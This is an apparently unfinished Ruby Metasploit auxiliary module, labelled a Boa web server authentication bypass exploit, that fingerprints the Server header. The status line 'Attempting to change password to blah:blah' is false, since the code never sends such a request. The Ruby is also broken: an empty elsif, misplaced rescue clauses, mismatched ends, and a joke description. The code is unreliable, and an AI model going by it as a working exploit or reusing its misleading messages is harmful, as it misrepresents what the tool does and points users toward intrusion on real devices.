##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary
	
	# Exploit mixins should be called first
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WMAPScanServer
	# Scanner mixin should be near last
	#include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        	=> 'Boa Authentication Bypass Exploit',
			'Version'     	=> '$Revision: $',
			'Description'	=> 'This module checks for your moms...',
			'Author'        => ['CG'],
			'License'	=> MSF_LICENSE,
			'References'	=>
				[
					[ 'URL', 'http://www.milw0rm.com/exploits/4542' ],
					[ 'URL', 'http://www.securityfocus.com/archive/1/479434'],
				]
		)
	
end

	def run
		

		begin
			res = send_request_raw({
				'version'	=> '1.1',
				'uri'		=>  '/home/index.shtml',
				'method'        => 'GET',	                        
			}, 10)
			
			if (res and res.headers['Server'])
				if res.headers['Server'] =~ /Boa/
					print_status("#{datastore['RHOST']} is possibly vuln #{res.headers['Server']}\n Attempting to change password to blah:blah")
				elsif 
					print_status("#{datastore['RHOST']} is not vuln #{res.headers['Server']}")
				end
			
			else
				''
			end

		end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH =>e
			puts e.message
		end
	end
#end

